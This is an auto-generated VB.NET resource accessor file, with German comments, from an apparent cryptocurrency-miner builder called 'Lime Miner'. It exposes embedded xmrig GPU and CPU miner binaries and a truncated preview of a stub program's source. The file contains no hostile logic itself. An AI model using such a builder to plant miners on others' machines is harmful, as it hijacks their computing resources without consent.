﻿'------------------------------------------------------------------------------
' <auto-generated>
'     Dieser Code wurde von einem Tool generiert.
'     Laufzeitversion:4.0.30319.42000
'
'     Änderungen an dieser Datei können falsches Verhalten verursachen und gehen verloren, wenn
'     der Code erneut generiert wird.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'Diese Klasse wurde von der StronglyTypedResourceBuilder automatisch generiert
    '-Klasse über ein Tool wie ResGen oder Visual Studio automatisch generiert.
    'Um einen Member hinzuzufügen oder zu entfernen, bearbeiten Sie die .ResX-Datei und führen dann ResGen
    'mit der /str-Option erneut aus, oder Sie erstellen Ihr VS-Projekt neu.
    '''<summary>
    '''  Eine stark typisierte Ressourcenklasse zum Suchen von lokalisierten Zeichenfolgen usw.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Gibt die zwischengespeicherte ResourceManager-Instanz zurück, die von dieser Klasse verwendet wird.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("Lime_Miner.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Überschreibt die CurrentUICulture-Eigenschaft des aktuellen Threads für alle
        '''  Ressourcenzuordnungen, die diese stark typisierte Ressourcenklasse verwenden.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property nyan() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("nyan", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Zeichenfolge, die 
        '''
        '''&apos;       │ Author     : NYAN CAT
        '''&apos;       │ Name       : Lime Miner
        '''
        '''&apos;       Contact Me    https : //github.com/NYAN-x-CAT
        '''
        '''&apos;       This program Is distributed for educational purposes only.
        '''
        '''
        '''Imports System.Security.Cryptography
        '''Imports Microsoft.Win32
        '''Imports System.Management
        '''Imports System
        '''Imports System.Net.Sockets
        '''Imports Microsoft.VisualBasic
        '''Imports System.Diagnostics
        '''Imports System.Reflection
        '''Imports System.Runtime.InteropServices
        '''Imports System.Collections.Generic
        '''Imports System.Drawing
        '''Imports Sy [Rest der Zeichenfolge wurde abgeschnitten]&quot;; ähnelt.
        '''</summary>
        Friend ReadOnly Property Program() As String
            Get
                Return ResourceManager.GetString("Program", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
        '''</summary>
        Friend ReadOnly Property Project1() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("Project1", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
        '''</summary>
        Friend ReadOnly Property xmrig() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("xmrig", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
        '''</summary>
        Friend ReadOnly Property xmrig_amd_notls() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("xmrig_amd_notls", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
        '''</summary>
        Friend ReadOnly Property xmrig_nvidia() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
        '''</summary>
        Friend ReadOnly Property xmrig_nvidia9() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia9", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
    End Module
End Namespace
